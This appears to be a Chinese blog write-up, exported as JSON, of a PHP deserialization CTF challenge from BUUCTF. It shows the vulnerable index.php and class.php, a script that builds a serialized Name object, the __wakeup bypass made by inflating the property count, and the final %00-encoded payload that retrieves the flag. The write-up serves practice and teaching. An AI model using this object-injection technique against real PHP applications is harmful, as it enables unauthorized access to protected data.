{"title":"BUU-[极客大挑战2019]PHP","uid":"03b1766a9dfb129451d74c3a9e2dbdc8","slug":"BUU-极客大挑战2019-PHP","date":"2022-07-23T15:25:34.000Z","updated":"2022-07-23T16:15:00.725Z","comments":true,"path":"api/articles/BUU-极客大挑战2019-PHP.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>BUU一道PHP反序列化题目。</p>\n<h2 id=\"0x01-访问靶场\"><a href=\"#0x01-访问靶场\" class=\"headerlink\" title=\"0x01 访问靶场\"></a>0x01 访问靶场</h2><p>打开靶场，提示有备份网站的好习惯，猜测有备份网站的文件</p>\n<p><img src=\"/post/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP.htm/image-20220723234627619.png\" alt=\"image-20220723234627619\"></p>\n<p>直接扫目录得到<a href=\"http://www.zip文件，解压：\">www.zip文件，解压：</a><br><img src=\"/post/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP.htm/image-20220723234910757.png\" alt=\"image-20220723234910757\"></p>\n<h2 id=\"0x02-代码审计\"><a href=\"#0x02-代码审计\" class=\"headerlink\" title=\"0x02 代码审计\"></a>0x02 代码审计</h2><p>查看index.php和class.php这两个主文件即可：</p>\n<p>index.php：<br><img src=\"/post/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP.htm/image-20220723235115548.png\" alt=\"image-20220723235115548\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'class.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$select</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'select'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$res</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$select</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看到<code>unserialize()</code>函数，应该存在反序列化漏洞。</p>\n<p>class.php：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Name</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yesyes'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'guest'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">!=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>NO!!!hacker!!!&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You name is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You password is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            \n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看到class.php文件就可以确定是有类的反序列化题目了。</p>\n<p>只要username&#x3D;&#x3D;&#x3D;’admin’即可输出flag。</p>\n<h2 id=\"0x03-常用的内置方法\"><a href=\"#0x03-常用的内置方法\" class=\"headerlink\" title=\"0x03 常用的内置方法\"></a>0x03 常用的内置方法</h2><p>涉及函数：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">_construct()：创建对象时初始化，当一个对象创建时被调用\n_wakeup() 使用unserialize时触发\n_sleep() 使用serialize时触发\n_destruction()：结束时销毁对象，当一个对象销毁时被调用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x04-构造payload\"><a href=\"#0x04-构造payload\" class=\"headerlink\" title=\"0x04 构造payload\"></a>0x04 构造payload</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Name</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yesyes'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>构造payload时候按照class类中的格式照抄，不要进行修改，否则会出错，由于最终需要使$username&#x3D;&#x3D;&#x3D;’admin’，声明Name对象时候直接传参即可，最后再进行序列化即可。</p>\n<p><img src=\"/post/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP.htm/image-20220724000205546.png\" alt=\"image-20220724000205546\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>输出结果中Name和username，Name和password之间是有不可见字符的，因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上ascii为0的字符（不可见字符）。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这里尝试将private修改为public，但最后得到的payload拿不到flag，会出错，只能使用private进行构造。</p></blockquote>\n<p>之后还需要绕过_wakeup方法：</p>\n<p><strong>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 _wakeup()函数的执行</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">原payload：O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n绕过：O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>之后需要还需要将输出的不可见字符变为%00：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?select&#x3D;O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP.htm/image-20220724001016682.png\" alt=\"image-20220724001016682\"></p>\n<p><img src=\"/post/BUU-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP.htm/image-20220724001027452.png\" alt=\"image-20220724001027452\"></p>\n<p>拿到flag。</p>\n<h2 id=\"0x05-总结\"><a href=\"#0x05-总结\" class=\"headerlink\" title=\"0x05 总结\"></a>0x05 总结</h2><p>1、构造payload的时类中的字段原样构造，不要修改其原数据（自己构造payload的时踩的坑）</p>\n<p>2、<strong>绕过_wakeup()方法：在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 _wakeup()函数的执行</strong></p>\n<p>3、private声明时最后的不可见字符，在构造payload的时需要编码为%00</p>\n","text":"0x00BUU一道PHP反序列化题目。 0x01 访问靶场打开靶场，提示有备份网站的好习惯，猜测有备份网站的文件 直接扫目录得到www.zip文件，解压： 0x02 代码审计查看index.php和class.php这两个主文件即可： index.php： include 'cl...","link":"","photos":[],"count_time":{"symbolsCount":"2.9k","symbolsTime":"3 mins."},"categories":[{"name":"反序列化","slug":"反序列化","count":5,"path":"api/categories/反序列化.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":5,"path":"api/tags/反序列化.json"},{"name":"PHP","slug":"PHP","count":5,"path":"api/tags/PHP.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E8%AE%BF%E9%97%AE%E9%9D%B6%E5%9C%BA\"><span class=\"toc-text\">0x01 访问靶场</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">0x02 代码审计</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E5%B8%B8%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">0x03 常用的内置方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E6%9E%84%E9%80%A0payload\"><span class=\"toc-text\">0x04 构造payload</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x05 总结</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUU-[RoarCTF2019]Easy-Calc","uid":"86385108ea30f567fcdfebd7ea538d02","slug":"BUU-RoarCTF2019-Easy-Calc","date":"2022-07-24T01:50:42.000Z","updated":"2022-07-24T02:19:16.439Z","comments":true,"path":"api/articles/BUU-RoarCTF2019-Easy-Calc.json","keywords":null,"cover":[],"text":"0x00BUU一道PHP解析特性题目。 0x01 原理原理1：利用PHP的字符串解析特性 参考文章：https://www.freebuf.com/articles/web/213359.html PHP将查询字符串（在URL或正文中）转换为内部$_GET或关联数组$_POST。...","link":"","photos":[],"count_time":{"symbolsCount":"1.4k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":10,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"},{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"},{"name":"PHP","slug":"PHP","count":5,"path":"api/tags/PHP.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUU-HardSQL","uid":"fc23abf567ea93cff7f9b201441e8d7a","slug":"BUU-HardSQL","date":"2022-07-22T11:29:37.000Z","updated":"2022-07-22T11:55:11.704Z","comments":true,"path":"api/articles/BUU-HardSQL.json","keywords":null,"cover":[],"text":"0x00BUU一到SQL注入题目。 0x01打开靶场： 先试试万能密码： 这里应该是把空格过滤了，测试一下： 输入admin’ ‘，还是返回同样的页面： 使用括号替换空格发现出现报错，没有出现那几个汉字，证明确实过滤了空格： 空格绕过原理： 括号是来包含子查询的，任何可以计算出结...","link":"","photos":[],"count_time":{"symbolsCount":"1.2k","symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"},{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}